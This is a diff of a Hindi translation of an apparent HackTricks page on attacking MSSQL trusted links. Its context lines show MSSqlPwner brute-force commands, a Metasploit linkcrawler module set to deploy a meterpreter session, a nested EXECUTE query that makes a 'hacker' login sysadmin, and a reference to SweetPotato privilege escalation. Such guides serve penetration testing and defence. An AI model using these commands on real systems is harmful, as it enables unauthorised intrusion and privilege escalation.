@@ -7,7 +7,7 @@
 
 ### Python
 
-[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) उपकरण impacket पर आधारित है, और यह kerberos टिकट का उपयोग करके प्रमाणित करने की अनुमति देता है, और लिंक श्रृंखलाओं के माध्यम से हमले करता है
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) टूल impacket पर आधारित है, और यह kerberos टिकट का उपयोग करके प्रमाणीकरण करने और लिंक श्रृंखलाओं के माध्यम से हमले की अनुमति देता है।
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -79,7 +79,7 @@ mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
 mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
 
 ```
-### नेटवर्क से डोमेन सत्र के बिना एन्यूमरेटिंग
+### डोमेन सत्र के बिना नेटवर्क से एन्यूमरेट करना
 ```
 
 # Interactive mode
@@ -94,7 +94,7 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ````
-### नेटवर्क से डोमेन सत्र के बिना एन्यूमरेटिंग
+### नेटवर्क से डोमेन सत्र के बिना एन्यूमरेट करना
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -196,13 +196,13 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-आप आसानी से metasploit का उपयोग करके विश्वसनीय लिंक की जांच कर सकते हैं।
+आप मेटास्प्लॉइट का उपयोग करके आसानी से विश्वसनीय लिंक की जांच कर सकते हैं।
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-ध्यान दें कि metasploit केवल MSSQL में `openquery()` फ़ंक्शन का दुरुपयोग करने की कोशिश करेगा (तो, यदि आप `openquery()` के साथ कमांड निष्पादित नहीं कर सकते हैं, तो आपको कमांड निष्पादित करने के लिए **हाथ से** `EXECUTE` विधि का प्रयास करना होगा, नीचे और देखें।)
+ध्यान दें कि metasploit केवल MSSQL में `openquery()` फ़ंक्शन का दुरुपयोग करने की कोशिश करेगा (तो, यदि आप `openquery()` के साथ कमांड निष्पादित नहीं कर सकते हैं, तो आपको कमांड निष्पादित करने के लिए `EXECUTE` विधि **हाथ से** आज़मानी होगी, नीचे और देखें।)
 
 ### मैनुअल - Openquery()
 
@@ -256,7 +256,6 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 कई लेखकों द्वारा विकसित एक रणनीति यह है कि एक SYSTEM सेवा को एक धोखाधड़ी या मैन-इन-द-मिडल सेवा के लिए प्रमाणीकरण करने के लिए मजबूर किया जाए जिसे हमलावर बनाता है। यह धोखाधड़ी सेवा तब SYSTEM सेवा का अनुकरण करने में सक्षम होती है जबकि यह प्रमाणीकरण करने की कोशिश कर रही होती है।
 
-[SweetPotato](https://github.com/CCob/SweetPotato) के पास इन विभिन्न तकनीकों का एक संग्रह है जिसे Beacon के `execute-assembly` कमांड के माध्यम से निष्पादित किया जा सकता है।
-
+[SweetPotato](https://github.com/CCob/SweetPotato) के पास इन विभिन्न तकनीकों का एक संग्रह है जिसे Beacon के `execute-assembly` कमांड के माध्यम से निष्पादित किया जा सकता है। 
 
 {{#include ../../banners/hacktricks-training.md}}
